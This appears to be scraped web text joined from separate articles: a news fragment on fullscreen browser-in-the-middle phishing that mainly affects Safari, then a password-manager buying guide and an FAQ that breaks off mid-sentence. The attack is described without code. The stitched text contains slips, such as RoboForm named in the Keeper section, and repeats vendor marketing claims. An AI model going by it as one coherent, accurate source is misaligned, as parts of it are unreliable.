numerous global outlets.

Since the browser is in full-screen mode, user interface (UI) and system elements are hidden, making spotting the attack somewhat more difficult.\nGuardrails in place\nAs a result, the victims log into different accounts in a remote browser, thinking they\u2019re doing it on their own device.\nThey still log in, but the process is done on the attacker\u2019s machine, which allows them to harvest login credentials, authentication cookies, and more.\n\u201cSquareX\u2019s research team has observed multiple instances of the browser\u2019s FullScreen API being exploited to address this flaw by displaying a fullscreen BitM window that covers the parent window\u2019s address bar, as well as a limitation specific to Safari browsers that makes fullscreen BitM attacks especially convincing,\u201d the researchers said in the report.\nThe \u201climitations specific to Safari browsers\u201d the researchers mentioned are apparently about notifications, since the Apple browser allegedly doesn\u2019t properly alert users when a browser window enters fullscreen mode.\nSign up to the TechRadar Pro newsletter to get all the top news, opinion, features and guidance your business needs to succeed!\nThe researchers said that competing browsers, such as Chromium-based ones, or Firefox, show an alert whenever fullscreen is active. While they might still miss the alert, the chances are smaller compared to Safari, where there is no alert. Instead, the only signal is a swipe animation that, as the researchers claim, can easily be missed.\n\"While the attack works on all browsers, fullscreen BiTM attacks are particularly convincing on Safari browsers due to the lack of clear visual cues when going fullscreen,\" SquareX concluded.\nThe researchers also said they reached out to Apple, who decided not to pursue it further - as apparently, the animation is signal enough.\nVia BleepingComputer\nYou might also like\n- This ancient browser security flaw affecting Safari, Chrome and Firefox is finally being fixed\n- Take a look at our guide to the best authenticator app\n- We've rounded up the best password managers\nSead is a seasoned freelance journalist based in Sarajevo, Bosnia and Herzegovina.

The app offers a seamless user experience.\n\u2705 You want it on every platform: NordPass has apps for Windows, Mac, Linux, iOS and Android, as well as extensions on Chrome, Firefox, Edge, Opera, Brave, and Safari.\n\u274c You won\u2019t use it much: NordPass might offer too many features for casual single user that won't make use of the many additional features.\n\u274c You want one subscription for family and business: NordPass doesn't offer a combined plan for your business and family, so you'll have to buy them separately.\n\ud83d\udd12 NordPass is a great password manager option for many individuals, families, and organizations, thanks to its array of advanced features and professional interface. It might be a bit too much for the needs of some, though. \u2605\u2605\u2605\u2605\u00bd\nThe vendors of one of the best VPN services around, NordVPN, have now made a password manager.\nNordPass Top Features:\n\ud83d\udd35 Unlimited password storage\n\ud83d\udd35 Data breach scanning\n\ud83d\udd35 Free 30 day premium trial\n\ud83d\udd35 Email masking\n\ud83d\udd35 Secure credential sharing\n\ud83d\udd35 Login monitoring\nNordPass Usage:\nNordPass is best suited for individuals, families, and businesses of all sizes. The interface is modern, smooth, and well suited for both beginners and professionals.\nNordPass offers some of the best security features out of all the password managers we have tested. It is the only password manager to use xChaCha20 encryption which offers better performance over AES-256 bit encryption used by Dashlane and RoboForm.\nNordPass has also added the ability to store and manage passkeys, further improving its functionality in an age where passwords may soon be a thing of the past.\nWhile not as cheap as Bitwarden, NordPass is one of the most affordable options with all features included at a single price point.\nNordPass Plans & Pricing:\nUnlike some competitors such as Keeper and 1Password, NordPass offers a free tier which provides storage for an unlimited number of passwords. The one downside being that only one active session can be used at a time.\nThe premium plan offers the same features as the free tier, with password strength detection, credential leak monitoring, and trusted password sharing included at $1.89 per month.\nThe family plan allows six users to access all of the features offered on the free and premium plan, with the two year commitment at $2.79 per month. There are also NordPass promo codes to bring down the cost.\nIf you are looking for a business password manager that includes family access, 1Password would be better suited to your needs.\nRead our full NordPass review.\nBest password manager for security\nSpecifications\nReasons to buy\nReasons to avoid\n\u2705 You want to prioritize security: Dashlane is one of the highest rated password managers for security, offering features such as real-time phishing alerts, dark web monitoring, a VPN, and secure notes storage.\n\u2705 You want a great user experience: Dashlane offers AI-powered autofill options to help you log in to your accounts faster, and offers syncing across all your devices.\n\u274c You're on a budget: With all its premium features, Dashlane doesn't exactly come cheap, and its miserly free version only lets you use a single device.\n\u274c You want extra 2FA options: Dashlane only offers two-factor authentication through the app, and doesn't offer SMS or biometric support (yet?).\n\ud83d\udd12 Dashlane is very close to its main rival NordPass, but it puts a bit more emphasis on security features. Its premium plans can be expensive, but it is one of the go-to choices for millions of users for a reason. \u2605\u2605\u2605\u2605\u00bd\nDashlane's password manager is one of the best on the market, and has some top features for the security-conscious.\nDashlane Top Features:\n\ud83d\udd35 AI autofill\n\ud83d\udd35 Passkey support and storage\n\ud83d\udd35 Passwordless login\n\ud83d\udd35 Digital wallet\n\ud83d\udd35 VPN included\n\ud83d\udd35 Secure notes storage\nDashlane Usage:\nDashlane's user reviews pitch it as one of the best password managers for user experience with a very simple and intuitive interface across the apps and browser extensions, and other features aimed at making using the app as simple as possible.\nOur testing certainly supports this, with the sign up process being very simple, and the extension automatically offering to import passwords from web browsers and other password managers.\nThe security settings also set Dashlane apart from the competition, and while it uses the industry standard AES-256 encryption (unlike NordPass), it also provides users with in-app two-factor authentication and secure storage for payment information and notes. Dashlane also supports passkeys, which are fast becoming a more secure alternative to passwords.\nDashlane also includes a VPN in its premium plan. Other password managers such as NordPass require your to sign up for the more expensive NordVPN Plus plan to include both a VPN and password manager. This Nord plan is $6 per month for one year, compared to Dashlane's $5 for both a password manager and VPN, showing a significantly better value for money in this regard.\nIts important to note that Dashlane's 2FA is only supported in app, with no biometric or SMS support available which is a shame, and something I would like to see expanded in the future.\nDashlane Plans & Pricing:\nOverall, Dashlane is one of the more expensive options on the list, but it does offer a free plan that allows you to store up to 25 passwords on a single device, and provides secure password sharing. NordPass' free plan is a better option, as it provides unlimited password storage, multi-factor authentication including biometrics, and 24/7 live chat support.\nThe Dashlane Premium plan sits at $5 per month and gives you unlimited storage for passwords and passkeys across an unlimited number of devices. You also receive phishing alerts, dark web monitoring, and a VPN. For those looking to couple a password manager and VPN on one plan, Dashlane Premium offers superior value for money, but may be a bit expensive for those just wanting a password manager.\nThe Family plan is $7.50 per month and includes 10 accounts with all of the features in the Premium tier, but only the admin will have access to the VPN. Dashlane offers more accounts in its family plan than any other password manager, making it an excellent choice for large families.\nRead our full Dashlane review.\n\"Password managers manage all the complexity (of storing many passwords) behind one master password\" - JD Sharman, former CEO of Dashlane\nBest password manager for mobile\nSpecifications\nReasons to buy\nReasons to avoid\n\u2705 You want easy autofill: RoboForm has some great autofill capabilities, making it easy to complete login forms.\n\u2705 You want advanced 2FA: RoboForm's 2FA supports email, SMS, authenticator app, passkey, trusted device, and hardware security key authentication.\n\u274c You want free device syncing: Syncing your passwords between devices is one of the most basic functionalities all good password managers should have, but the free version of RoboForm omits this.\n\u274c You want a VPN included: Unlike some of the other password managers, RoboForm doesn't offer a VPN which I see as an essential in this day and age.\n\ud83d\udd12 RoboForm is a well-priced password manager that has great autofill and mobile functionality, but device syncing isn't available on the free version. \u2605\u2605\u2605\u2605\u00bd\nRoboForm's pricing fills the gap between NordPass and Dashlane, but offers a superior 2FA app and mobile functionality.\nRoboForm Top Features:\n\ud83d\udd35 Two-factor authenticator\n\ud83d\udd35 TOTP authenticator\n\ud83d\udd35 Breach & compromise monitoring\n\ud83d\udd35 Cloud backup\n\ud83d\udd35 Emergency access\n\ud83d\udd35 Local-only mode\nRoboForm Usage:\nRoboForm has some of the best multi-platform support I have seen from any password manager, working across Windows, Mac, Android, iOS, Linux, and Chrome OS. But when it comes to mobile devices, RoboForm really shines.\nThe app allows you to automatically sync your data between the mobile apps and your browser, and includes highly granular control over accounts settings and privacy, which is particularly handy for those on the go.\nRoboForm's 2FA offers support across email, SMS, authenticator app, passkey, trusted device, hardware security key, making it far superior to Dashlane's 2FA app - plus, RoboForm's advanced authenticator is available even at the free tier. As an added bonus, RoboForm's free account will even notify you about your passwords it has detected in data breaches.\nOne issue with the RoboForm free tier is that you aren't able to access your password manager via the web or any other devices - something that NordPass' free tier allows you to do even if it is only one active session at a time. So if you're looking for a free web-based account, NordPass is probably the better option.\nAs for paid features, RoboForm Premium gives you data breach monitoring for 5 email accounts, a local only mode that means all your data is stored purely on your device and not on RoboForm's servers (very handy for the privacy-conscious). You can also securely share files and folders from the RoboForm app.\nRoboForm doesn't offer a VPN, which might be a sticking point for those looking for the ultimate password security package. However, you are already getting some decent features at a very attractive price point, which I'll discuss below.\nRoboForm Plans & Pricing:\nAs I mentioned, RoboForm offers a feature-rich free tier. But how much does a Premium account cost? RoboForm is very reasonable in its pricing, with the password manager currently available for $1.87 per month for the first year ($22.44).\nAt this price point, RoboForm is sandwiched between Dashlane and NordPass. You could opt for the cheaper pricing from NordPass and lose out on RoboForm's advanced 2FA and excellent mobile functionality, or opt for Dashlane's more expensive plan to grab a VPN. RoboForm therefore fills a niche between some of the best password managers.\nAlternatively, if you want accounts for whole household, the RoboForm Family plan is $2.98 for the first year ($35.76), which again places it firmly between NordPass and Dashlane's family pricing.\nOverall, RoboForm is definitely worth considering if you're constantly on the go and want advanced account settings control and need an advanced 2FA app.\nRead our full Roboform review.\nBest free password manager\nSpecifications\nReasons to buy\nReasons to avoid\n\u2705 You don\u2019t want to pay anything: There isn\u2019t another password manager on the market that gives away so much without demanding any of your money.\n\u2705 You want open source software: Being open source means it can\u2019t really get away with hiding any major flaws or inconvenient truths.\n\u274c You value a slick interface above all else: Although its UI is perfectly usable, there are occasions where it isn't as seamless as we'd like.\n\ud83d\udd12 Bitwarden is absolutely stellar when it comes to value, giving away a very competent password manager with features that its rivals usually closet behind a paywall. Some minor UI issues are the only real drawbacks. \u2605\u2605\u2605\u2605\u00bd\nBitwarden offers a feature rich and near-unbeatable free tier, ands its Premium plans are some of the cheapest around.\nBitwarden Top Features:\n\ud83d\udd35 Exceptional free plan\n\ud83d\udd35 Self hosting options\n\ud83d\udd35 Breach monitoring\n\ud83d\udd35 Unlimited devices\n\ud83d\udd35 Passkey support\n\ud83d\udd35 Open-source\nBitwarden Usage:\nBitwarden really switches things up when it comes to password management. The free tier beats the offerings of NordPass and even rivals the paid plan, offering storage across an unlimited devices, breach monitoring, passkey support, email aliases, and even the option to self host on your own network.\nAdditionally, the free tier includes a password and username generator, payment and identity storage, free sharing with one other user, and the ability to securely export your data from the app.\nWhen it comes to the paid plans, things just keep getting better. Premium improves two-step login from the Hardware Security Key, Email, and Authenticator App included in the free tier by adding Yubico OTP to the mix. You also get a TOTP integrated authenticator, priority support, encrypted sharing for text and files, and a up to 1GB encrypted file attachment.\nIt would be nice to see even more added to the Premium line up, such as a VPN, but the pricing more than makes up for this.\nBitwarden Plans & Pricing:\nBitwarden's free plan is more than capable of offering everything you could need for password management, but if you do decide to upgrade, Bitwarden's Premium plan is one of the most cost effective around.\nThe Premium plan is $10 per year. Yes, $10. Less than $1 per month. Alternatively, you can opt for the Family plan, which includes 6 Bitwarden Premium accounts for less than the cost of a single Dashlane Premium account. The Family plan is $3.33 per month, or $40 for the year, and includes everything in the Premium tier, plus a family vault for securely storing and sharing important files and data.\nBitwarden is the top pick if you're looking for a free password manager, offering a feature set that beats some of the paid plans on this list.\nRead our full Bitwarden review.\nBest password manager for syncing and sharing\nSpecifications\nReasons to buy\nReasons to avoid\n\u2705 You want plenty of features: Keeper has a lot of features to get your hands on, making it a great choice for all users.\n\u2705 You want a customizable plan tailored to you: RoboForm's bolt-on business features make it great for customizing a plan that suits your needs.\n\u274c You want everything included: While great for customization, the add-on prices quickly mount up.\n\u274c You want a free option: True to its premium stylings, there is no free version of Keeper, only a free trial for 30 days.\n\ud83d\udd12 Keeper is a good pick for those looking for great password syncing and sharing options, and has plenty of features available. However, you do have to pay extra for those add-ons, and there isn't a free tier. \u2605\u2605\u2605\u2605\u00bd\nKeeper offers some of the best syncing and storage options from any password manager, and some great business features too.\nKeeper Top Features:\n\ud83d\udd35 Unlimited syncing and sharing\n\ud83d\udd35 Great security compliance\n\ud83d\udd35 Emergency access\n\ud83d\udd35 Identity and payment secure storage\n\ud83d\udd35 Autofill\n\ud83d\udd35 24/7 support\nKeeper Usage:\nKeeper has some excellent features that make it a highly intuitive and easy-to-use password manager. Firstly, login can be done quickly and securely thanks to Keeper's support for biometric authentication, meaning a simple facial scan or fingerprint can grant you access to your account.\nUnlimited is a word that you'll see frequently on the list of Keepers features. You get unlimited password storage across an unlimited number of devices, with unlimited syncing for passwords as well as your identity and payment information (which is super easy to autofill).\nUnfortunately, Keeper's list of included features is fairly short compared to other solutions in this guide. For example, if you want breach monitoring or a secure cloud backup, you're going to have to spend extra on top of Keeper's already fairly expensive pricing.\nKeeper's features are far better on the business side of things, with some highly customizable plans with excellent optional extras, great security compliance (GDPR, HIPAA, SOC2), and an admin dashboard that makes access management and security checks a breeze - but if you want to read more about that, you might want to check out the best business password managers.\nKeeper Plans & Pricing:\nKeeper doesn't offer a free plan, which is a shame considering many of Keeper's premium features can be accessed as part of the free plans from Bitwarden, NordPass and Roboform.\nCompared to the other password managers I've discussed, Keeper costs almost as much as Dashlane but without as many features. For example, Keeper is $4 per month for the first year ($47.99), but doesn't include a VPN, breach monitoring, or phishing alerts, making it a relatively expensive choice when you consider what you're missing. Even NordPass and RoboForm include breach monitoring for half the cost.\nThe Keeper Family plan improves things slightly with the inclusion of a 10GB cloud storage, 5 private vaults, and some control over sharing. But at $8.50 per month for the first year ($101.99), there are definitely more budget friendly options with a greater range of features to choose from.\nKeeper is definitely a better choice for business users than as a personal solution.\nRead our full Keeper Security review.\nBest password manager for families\nSpecifications\nReasons to buy\nReasons to avoid\n\u2705 You're a family: 1Password is great for family use, thanks to its sharing features.\n\u2705 You want good security: 1Password has a lot of useful security features, such as keylogging and phishing protection.\n\u274c You want a free password manager: 1Password is another manager that doesn't have any free options available.\n\u274c You want live chat support: 1Password only offers support through email, forum, and social media.\n\ud83d\udd12 1Password is another popular choice among the third-party password managers, with a good track record and useful features for families and the security conscious. \u2605\u2605\u2605\u2605\n1Password offers excellent family-friendly features at an affordable price point, making it the best password manager for families.\n1Password Top Features:\n\ud83d\udd35 Credential strength checks\n\ud83d\udd35 Autosave + autofill\n\ud83d\udd35 Unlimited vaults (family plan)\n\ud83d\udd35 Admin dashboard (family plan)\n\ud83d\udd35 Third-party support\n\ud83d\udd35 Free 14 day trial\n1Password Usage:\n1Password can be accessed from across a very wide range of devices, platforms and browsers. Support is offered for macOS, iOS, watchOS, Windows, Android, and Linux, as well as the Chrome, Safari, Edge, Firefox, and Brave web browsers.\nDuring installation, there is a guided setup that will walk you through the steps to install 1Password on your chosen platform, making it very user friendly users, both new and experienced.\nAlmost everything you share or store through 1Password is protected by AES 256-bit encryption, with the option to add additional Two-Key Derivation for additional account security, and the option to use secure remote password (SRP) protocol to encrypt your data while in transit.\nOne unique feature 1Password offers compared to other providers is the ability to hide selected 1Password vaults while travelling or crossing borders, making it a particularly attractive option for journalists or other who regularly travel.\nNow, you may be wondering why you would opt for 1Password over Bitwarden's far cheaper family plan. This comes down to how much your care about security and privacy - Bitwarden's security tools are good, but 1Password provides far more control over the level of security and privacy you would like on your account.\nWhat makes 1Password particularly suited for families is how easy it is to use, and the guidance offered by 1Password along the way. While lacking a 24/7 live chat, 1Password does offer support through other channels, such as email and support forum.\nThe Family dashboard is also extremely helpful when managing accounts, with easy account recovery options. You can even share 1Password data securely with anyone, including those without a 1Password account. The pricing isn't anything to turn your nose up at either, as I'll discuss below.\n1Password Plans & Pricing:\nThe 1Password Premium plan is $35.88 for a year, working out at $2.99 a month - placing it in the middle of the road when compared to the likes of NordPass, Dashlane, and RoboForm. But the price is certainly worth it for the security features if you are that way inclined.\nAs for 1Password Families, you'll get 5 Premium accounts and an admin dashboard for $59.88 per year, or $4.99 per month, OR $1.39 per user per month, making it a very reasonably priced plan for families who will make full use of the five accounts.\nRead our full 1Password review.\nBest password manager for privacy\nSpecifications\nReasons to buy\nReasons to avoid\n\u2705 Privacy is a priority for you: Proton's track record in the online privacy market is second to none, and this focus has carried over into its password manager as well.\n\u2705 You don't want to pay anything: Like Bitwarden, Proton Pass has a very well-rounded free version, although Bitwarden has the edge in terms of features and pedigree.\n\u274c You want free breach monitoring: Proton Pass doesn't include breach or dark web monitoring at the free tier, reserving this feature for its paid plans.\n\u274c You're on a budget: Other options such as NordPass and Roboform beat Proton on price by quite some margin.\n\ud83d\udd12 Proton Pass is a very competent password manager, with some great features, including email aliasing and a 2FA authenticator. Although it is relatively new to the field, the company's ethos and reputation are reasons to be positive about this one. \u2605\u2605\u2605\u2605\nProton Pass has emerged as an excellent password manager over the passed two years, and seems determined to rival the top providers with better features and competitive pricine.\nProton Pass Top Features:\n\ud83d\udd35 Swiss privacy laws\n\ud83d\udd35 Integrated 2FA\n\ud83d\udd35 Dark web monitoring\n\ud83d\udd35 Passkey support\n\ud83d\udd35 Proton Sentinel\n\ud83d\udd35 Custom email aliases\nProton Pass Usage:\nProton Pass is the newest password manager to grace this guide, produced by the privacy-gurus at Proton. You may have heard of some of Proton's other products, such as Proton VPN and Proton Mail. Just like their other offerings, Proton Pass is all about privacy.\nFirstly, as a Swiss-headquartered company, everything that passes through Proton's servers is protected by some of the strongest privacy legislation in the world. Secondly, Proton Pass uses 256-bit AES-GCM encryption for its vaults, meaning that only you can create new vault keys, and not even Proton can see them.\nProton offers a free tier that rivals even Bitwarden's solution, with automatic syncing across devices and browsers, 1GB encrypted storage, passkey support, unlimited logins, and 10 email aliases, plus access to all of the free features included in Proton's portfolio of other products.\nAs for Pass Plus, you get everything included at the free tier with an upgraded 10GB of storage, unlimited credit card storage, 50 vaults for organized storage, integrated 2FA, unlimited email aliases with custom domains, dark web monitoring, and access to Proton Sentinel (more on that below). Pass Family includes everything you see above across 6 user accounts with a shared 50GB encrypted storage.\nNow, the thing that makes Proton Pass the best password manager for privacy is the Proton Sentinel program. Sentinel was developed for people who frequently handle highly-sensitive data or comms, such as journalists, activists, executives. Sentinel enables additionals security protection, and adds strict challenges for suspicious login attempts, along with enhanced visibility into login attempts and account changes. Senintel is included in both the Plus and Family plan.\nProton Pass Plans & Pricing:\nProton Pass is another reasonably priced password manager that offers an excellent range of functionality and privacy features. Obviously, the free tier is a very strong contender for the best free password manager, but misses out to Bitwarden due to the lack of breach monitoring and self hosting options, but it is still a fantastic free product.\nOn to Proton Plus, which has a monthly cost of $2.99, or $35.88 per year, matching the premium pricings of 1Password, but costing slightly more than other providers such as NordPass and RoboForm. But as they say, privacy comes at a premium, and if privacy is what you want, Proton Pass is what you should get.\nThe Family plan is currently $4.99 per month, or $59.88 for the year, making it cheaper than Dashlane's single user plan and again matching 1Password's Family pricing. It's still unable to compete with the pricing offered by NordPass and Roboform, but that doesn't detract from the quality that Proton has managed to build in to its password manager in the last two years.\nRead our full Proton Pass review.\nBest password manager for small business\nSpecifications\nReasons to buy\nReasons to avoid\n\u2705 You're a small business: With its good password sharing features, we think KeepSolid Passwarden would make a great choice for small teams.\n\u2705 You have a big family or lots of friends: Passwarden's family plan includes 7 premium accounts, making it perfect for busy households.\n\u274c You're not willing to spend: KeepSolid Passwarden is relatively expensive compared to the competition, so be warned.\n\u274c You're larger than a small team: With a lack of admin features, centralized management and SSO, KeepSolid Passwarden wouldn't really be suitable for large businesses or enterprises.\n\ud83d\udd12 KeepSolid Passwarden offers all the features you could want from a password manager if you're an individual, family, or small team, but if you're anything bigger, then this probably isn't for you. \u2605\u2605\u2605\u2605\nPasswarden offers an excellent family plan with great security features, making it a good budget alternative for SMBs looking for credential protection that doesn't break the bank.\nPasswarden Top Features:\n\ud83d\udd35 Duress mode\n\ud83d\udd35 Security dashboard\n\ud83d\udd35 AES-256 and \u0415\u0421 \u0440-384 encryption\n\ud83d\udd35 2FA\n\ud83d\udd35 Offline mode\n\ud83d\udd35 Secure sharing\nPasswarden Usage:\nFirst and foremost, lets talk about a feature I don't think I've seen any other password manager include. For situations where someone may force you to open the app to steal your credentials, Passwarden offers a 'Duress' mode which is activated by entering a dedicated password that will hide any passwords or data that you choose to be hidden when Duress mode is activated.\nPasswarden also inlcudes a dedicated security dashboard that displays all the metrics and data you could possible want relating to your account. It will show weak, reused, and compromised passwords, and offer guidance on how to change them to be more secure. It also offers guidance on how to avoid falling prey to scams and fraud, and will notify you if it detects any of your personal info floating around on the dark web.\nAdditonally, Passwarden includes vault sharing that allows you to securely pass on important data, such as the Wi-Fi password or company credit card information, to other users without exposing that data to prying eyes thanks to 256-bit AES-GCM encryption.\nYou can also choose to protect your Passwarden account with 2FA that supports PINs, passwords, hardware tokens or authentication codes, and even biometrics.\nFor the personal plan, you will have a single account that supports usage across an unlimited number of devices that includes everything mentioned above, and more. The family plan includes 7 premium accounts, making it perfect for large families or small business teams.\nPasswarden Plans & Pricing:\nPasswarden is somewhat unique in its pricing structure. You can either do a monthly subscription that is billed annually, or pay a one time fee to gain access to a Passwarden lifetime license.\nFor the personal plan, the monthly cost is $1.66, or $19.92 per year, making it a fairly affordable choice compared to other more expensive alternatives such as Dashlane, Proton Pass, and even NordPass. Alternatively, you can pay the lifetime fee of $199.99 and never have to spend another penny.\nFor the family plan, the monthly cost is just $3.33 ($0.47 per account), or $39.96 per year, making it a close rival to some of the single account plans on this list, such as those offered by Dashlane and 1Password. The lifetime fee is $249.99, so if you are planning on using Passwarden for more than 6 years is probably worth the investment.\nRead our full Passwarden review.\nBest for Apple users\nSpecifications\nReasons to buy\nReasons to avoid\n\u2705 You're use Apple devices: mSecure offers iCloud syncing, and even has an Apple Watch app, making it a great choice for Apple fans.\n\u2705 You frequently forget passwords: mSecure not only includes auto-fill and a password generator, but can also show you your password history.\n\u274c You dont use Apple devices: mSecure doesn't offer full functionality for other devices that aren't part of the Apple ecosystem.\n\u274c You want a decent free tier: mSecure's free tier is very limited in its features, so you might be better placed turning to Bitwarden or Proton Pass for a free password manager.\n\ud83d\udd12 mSecure is a great password manager for Apple users, given its iCloud support and Apple Watch app. It also makes regular improvements to its service, based on what we've seen so far. \u2605\u2605\u2605\u2605\nmSecure offers great integrations and apps for Apple lovers, but it's free tier is slightly lacking.\nmSecure Top Features:\n\ud83d\udd35 Password history\n\ud83d\udd35 Apple Watch app\n\ud83d\udd35 iCloud syncing\n\ud83d\udd35 Biometric authentication\n\ud83d\udd35 Securiy center\n\ud83d\udd35 Vault organization\nmSecure Usage:\nRight out of the gate, if you're looking for a free plan then mSecure is not the choice for you. However, if you're an Apple lover looking for integrations across all your devices with some great features, then this could be the password manager for you.\nThe free plan includes unlimited password storage - and thats it.\nmSecure is best used on Apple devices, as it has a dedicated Apple Watch app and can be set up to sync via iCloud. This is a double edged sword however, as mSecure doesn't offer the same levels of functionality across other platforms. In testing, we found mSecure's support for Windows and Android to be fairly laclustre.\nmSecure confusingly offers two paid tiers, an Essentials plan and and a Premium plan, with the only differences between the two being the inclusion of 2FA, secure file attachments, and some organizational and sharing options, with the difference in cost being less than $3 per year.\nmSecure does offer biometric authentication and a secure center that will helpfully point out weak or reused passwords, and will provide analysis on how best to secure your accounts.\nIf you're an organizational nut, mSecure makes a good case. With the Premium plan, you can apply custom tags, templates, images, filers and usernames to your vault data to help you sort and find what you're looking for faster.\nmSecure Plans & Pricing:\nOutside of the very basic free plan, mSecure has four paid tiers. The first two, Essentials and Premium, are basically the same apart from the differences pointed out above. Essentials is $1.66 per month when charged anually ($19.92), while the premium plan is $1.87 per month on the annual charge ($22.44).\nThe Family plan is $3.74 per month when charged annually ($44.88), and includes 5 Premium accounts with a basic admin dashboard. The Teams plan is $19.90 per month on the annual charge ($238.8), and includes 10 premium accounts with the option to add more for additional cost.\nRead our full mSecure review.\nBest passwordless password manager\nSpecifications\nReasons to buy\nReasons to avoid\n\u2705 You don't want a master password: LogMeOnce lets you do away with a master password and instead just use your fingerprint, PIN, a QR code, or even a selfie.\n\u2705 You want excellent 2FA support: LogMeOnce supports Selfie-2FA, SMS Message, Voice Call, Email Message, Google Authenticator / TOTP, USB Flash Drive, X.509 Certificate, and YubiKey Security Key authentication.\n\u274c You dark web monitoring: LogMeOnce doesn't include dark web monitoring as standard in any of its plans, and you'll have to pay extra to get it.\n\u274c You're on a budget: Both the Professional and Ultimate plans are comparatively expensive to other solutions in this guide.\n\ud83d\udd12 LogMeOnce is a competent password manager that offers convenience in the form of passwordless access to your vault. Its lack of support for browsers outside the mainstream is the only real negative. \u2605\u2605\u2605\u2605\u00bd\nLogMeOnce\nLogMeOnce Top Features:\n\ud83d\udd35 Great 2FA and MFA support\n\ud83d\udd35 Beneficiary support\n\ud83d\udd35 Password tracking\n\ud83d\udd35 Emergency access options\n\ud83d\udd35 Login audit and activity tracker\n\ud83d\udd35 Unlimited devices\nLogMeOnce Usage:\nThere are two main talking points for LogMeOnce, the first being the passwordless login, and the second being the range of 2FA methods.\nLogMeOnce, as the name suggests, prides itself on not needing a master password, and offering numerous other secure login methods that are often quicker and easier than using a password.\nOn the 2FA side of things, LogMeOnce supports more authentication methods than any other password manager, providing authentication via Selfie-2FA, SMS Message, Voice Call, Email Message, Google Authenticator / TOTP, USB Flash Drive, X.509 Certificate, and YubiKey Security Keys.\nThe free account is fairly well featured, offering unlimited password storage, unlimited autofill, and unlimited syncing across devices. You also get three secure notes, three stored credit cards, and can send and recieve secure passwords a total of five times. The free tier also includes a password generator with a security score calculator, as well as security audits and 2FA through email and Google Authenticator.\nAs with mSecure, LogMeOnce also offers two tiers for its individual plan, Professional and Unlimited. Professional includes everything at the free tier, but bumps up the secure notes and secure sharing to 50 of each and adds unlimited credit card storing. You can also set a beneficiary for your apps and accounts, so that if you lose access you can have someone you trust maintain access to your accounts. The Professional plan also adds a few extra 2FA methods as well as MFA and some other nice-to-haves.\nThe Unlimited Plan includes all of this, but with unlimited secure notes and password sharing, access to all the 2FA methods, along with other security-oriented features such as remote logout, emergency access, and comprehensive security reporting. You also get access to priority email and live chat support.\nLogMeOnce Plans & Pricing:\nThe Professional plan is priced at $2.50 per month, making it a middle of the road option compared to other password managers in this guide. Ultimate will set you back $3.25 per month, and the family plan is $4.99 with 6 Premium accounts and a family dashboard included.\nIf you want to include dark web monitoring, which I would say is a fairly essential part of any password manager, you'll have to spend an extra $1.67 per month for the individual plans, or an extra $3.34 for the family plan, making it a comparatively expensive service.\nRead our full LogMeOnce review.\nD\u00e9sir\u00e9 has been musing and writing about technology during a career spanning four decades.

But the advantages of using one are quite clear.\nRather than being tied to the first-party managers offered by the likes of Apple and Google, using a standalone password manager means that you can access your credentials no matter what platform or device you are on.\nThey also give you the ability to organize your passwords how you like, by letting you create folders and grant different levels of access to certain items in your vault. Some come with additional tools, like a VPN in some cases, too.\nHow does a password manager work?\nA Password manager is a very simple and easy to use utility that requires minimal user interaction, since most of its actions are automated. They will work across numerous platforms, and they should feature a browser extension for use on desktop computers, as well as an app for smart devices such as your mobile phone. The passwords you use on each platform will synchronize across all the devices you use the password manager with.\nOnce you set up your password manager, you can go ahead and create whatever digital accounts you want. They will usually throw up a prompt to create a strong password for you when doing so - this is the password generation feature of the manager. Once you accept, it will then store the password and username for you in its vault, so when you next go to log in, you should find your credentials already filled out for you.\nIf you ever want to change or update your password for an existing account, you can do this too. Again, a prompt will usually appear from the password manager, confirming whether you want to overwrite the existing password with the new one you have created, ensuring your password manager remains up to date. Some password managers even have a version history, so you can see the previous passwords you have used.\nAs for importing your existing passwords stored on another manager, this should be a fairly straightforward process. Many managers will give you the option to import and export your passwords as a csv file, or any one that can be opened with spreadsheet software like Microsoft Excel or Google Sheets. This allows you to export them out from your old manager and import them into your new one.\nIf you have your passwords stored manually in a spreadsheet, you can also import that into your new manager too, providing you follow the correct formatting for the manager in question.\nWhat are the most secure password managers?\nUnderstandably, this is one of the most important questions to ask of a password manager. You would expect any password manager worth its salt would be secure as a given, but no one is perfect and some have had issues. LastPass, for instance, although a very reputable and popular choice, did suffer a security breach, and although the company reassured users that no passwords were accessible, it is still a cause for concern.\nThe managers offered by big tech companies, mainly Google and Apple, are generally very secure, as you might expect. Not only do they have the pockets deep enough to maintain the best protection possible, it would also be a huge PR disaster should they incur any major breaches, and companies of that size have an awful lot to lose.\nHow safe are password managers?\nAll the best password managers are very safe, using the best encryption methods to store your passwords securely.\nZero-knowledge architecture is one of the core principles for managers to keep your passwords as safe as possible. This means that no one but the user has access to the passwords contained in the encrypted vault. Even the vendor and providers of the cloud backup service for your passwords are unable to see what your passwords actually are - only you have the power to decrypt your stored passwords, using your master password, or biometric data if you have this set up on supported password managers.\nComplex algorithms are used to encrypt passwords, and there are different methods. Some managers, such as NordPass, use something called XChaCha20, which is military grade and considered to be at the cutting edge of current encryption technology. It is also favored by big tech companies like Google, and is faster than more traditional methods such as AES-256.\nAlso, NordPass claims that such methods may be crackable with new technologies - for instance, quantum computing could put traditional methods of encryption at risk - but it believes XChaCha20 is resistant to these dangers.\nAll good password managers will also allow for biometric login and feature multi-factor authentication, two aspects which most people will be familiar with by now. The former involves technologies that recognize the physical aspects of the user, such as fingerprint scanners and facial recognition cameras, to authenticate them as the legitimate user.\nMulti-factor authentication is an added layer of security on top of your password to make sure that it\u2019s actually you who has entered your password on a given site or service, usually by sending a text message code on your phone that you have to input to make sure it is you. There are also separate authenticator apps you can have on your phone that give you a code to authenticate your login instead, if you\u2019d rather not receive an SMS code.\nAnd as with any piece of digital tech, how it is used by an individual or business goes a long way in determining how secure it remains. At the very least, make sure you are accessing your manager on a secure and protected network - always be cautious when using them in spaces with public wifi - and make sure you're using the best malware removal tools and the best antivirus software for your system.\nSmartphones are generally very secure in this regard, although you should always be careful when downloading apps to make sure they are trustworthy - the Google Play store, for instance, has had its fair share of malicious apps doing the rounds recently.\nAlso, if you are using a master password to secure your password vault, then make sure it is a strong one. This will be one that you will have to remember yourself, so a long and complex string of various random characters will probably be out of the question.\nCurrent expert advice suggests that for passwords you choose yourself, a string of three random words together is quite strong, as it will be hard to guess and easy to remember for yourself. Whatever you use, just make sure to avoid ones that are easy to crack, like your mother\u2019s maiden name, your birthday, or \u2018password1234\u2019.\nCan a password manager be hacked?\nIn a word: yes - in the sense that virtually any computer system can be hacked in theory. But the password managers in our list have a great safety record and utilize industry-standard encryption methods to protect your most valuable of assets. If we ever catch wind of any compromises to their security posture, we\u2019ll be sure to 